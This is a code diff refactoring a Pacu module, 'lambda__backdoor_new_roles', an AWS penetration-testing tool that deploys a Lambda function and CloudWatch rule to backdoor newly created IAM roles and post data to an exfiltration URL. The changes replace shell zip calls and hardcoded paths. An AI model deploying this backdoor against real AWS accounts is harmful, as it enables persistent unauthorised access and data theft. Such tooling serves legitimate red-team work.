@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 import argparse
 from botocore.exceptions import ClientError
+from pathlib import Path
 from copy import deepcopy
-import subprocess
 import random
 import string
+import zipfile
 import os
 
-from pacu.core.lib import session_dir
+from pacu.core.lib import session_dir, module_data_dir
 
 module_info = {
     'name': 'lambda__backdoor_new_roles',
@@ -44,17 +45,23 @@ def main(args, pacu_main):
     print = pacu_main.print
     input = pacu_main.input
     fetch_data = pacu_main.fetch_data
+
+    MODULE_PATH = Path(__file__).parent
+    MODULE_SESSION_PATH = module_data_dir(module_info['name'])
+    CREATED_LAMBDA_FUNCTIONS_PATH = MODULE_SESSION_PATH/'created-lambda-functions.txt'
+    CREATED_CLOUDWATCH_EVENTS_RULES_PATH = MODULE_SESSION_PATH/'created-cloudwatch-events-rules.txt'
+    LAMBDA_FUNCTION_ZIP_PATH = MODULE_SESSION_PATH/'lambda_function.zip'
     ######
 
     if args.cleanup:
         created_lambda_functions = []
         created_cwe_rules = []
 
-        if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
-            with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
+        if os.path.isfile(CREATED_LAMBDA_FUNCTIONS_PATH):
+            with open(CREATED_LAMBDA_FUNCTIONS_PATH, 'r') as f:
                 created_lambda_functions = f.readlines()
-        if os.path.isfile('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name'])):
-            with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'r') as f:
+        if os.path.isfile(CREATED_CLOUDWATCH_EVENTS_RULES_PATH):
+            with open(CREATED_CLOUDWATCH_EVENTS_RULES_PATH, 'r') as f:
                 created_cwe_rules = f.readlines()
 
         if created_lambda_functions:
@@ -77,9 +84,9 @@ def main(args, pacu_main):
                     break
             if delete_function_file:
                 try:
-                    os.remove('./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
+                    os.remove(CREATED_LAMBDA_FUNCTIONS_PATH)
                 except Exception as error:
-                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
+                    print('  Failed to remove {}'.format(str(CREATED_LAMBDA_FUNCTIONS_PATH)))
                     print('    {}: {}'.format(type(error), error))
 
         if created_cwe_rules:
@@ -106,9 +113,9 @@ def main(args, pacu_main):
                     break
             if delete_cwe_file:
                 try:
-                    os.remove('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
+                    os.remove(CREATED_CLOUDWATCH_EVENTS_RULES_PATH)
                 except Exception as error:
-                    print('  Failed to remove ./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
+                    print('  Failed to remove {}'.format(str(CREATED_CLOUDWATCH_EVENTS_RULES_PATH)))
                     print('    {}: {}'.format(type(error), error))
 
         print('Completed cleanup mode.\n')
@@ -126,7 +133,9 @@ def main(args, pacu_main):
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
 
-    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at '
+                            'least the IAM UpdateAssumeRolePolicy and GetRole permissions. Enter the ARN now or just '
+                            'press enter to enumerate a list of possible roles to choose from: ')
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
@@ -140,23 +149,21 @@ def main(args, pacu_main):
         target_role_arn = roles[int(choice)]['Arn']
 
     # Import the Lambda function and modify the variables it needs
-    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
-        code = f.read()
+    with open(MODULE_PATH/'lambda_function.py.bak', 'r') as f:
+        source_code = f.read()
 
-    code = code.replace('POST_URL', args.exfil_url).replace('BACKDOOR_ARN', args.arn)
-
-    with open(session_dir()/'modules'/module_info['name']/'lambda_function.py', 'w+') as f:
-        f.write(code)
+    source_code = source_code.replace('POST_URL', args.exfil_url).replace('BACKDOOR_ARN', args.arn)
 
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
-        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(module_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        with zipfile.ZipFile(LAMBDA_FUNCTION_ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            zip_file.writestr('lambda_function.py', source_code)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
 
-    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
+    with open(LAMBDA_FUNCTION_ZIP_PATH, 'rb') as f:
         zip_file_bytes = f.read()
 
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
@@ -223,10 +230,10 @@ def main(args, pacu_main):
             print(code)
 
     if created_resources['LambdaFunctions']:
-        with open(session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt', 'w+') as f:
+        with open(CREATED_LAMBDA_FUNCTIONS_PATH, 'w+') as f:
             f.write('\n'.join(created_resources['LambdaFunctions']))
     if created_resources['CWERules']:
-        with open(session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt', 'w+') as f:
+        with open(CREATED_CLOUDWATCH_EVENTS_RULES_PATH, 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
     print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
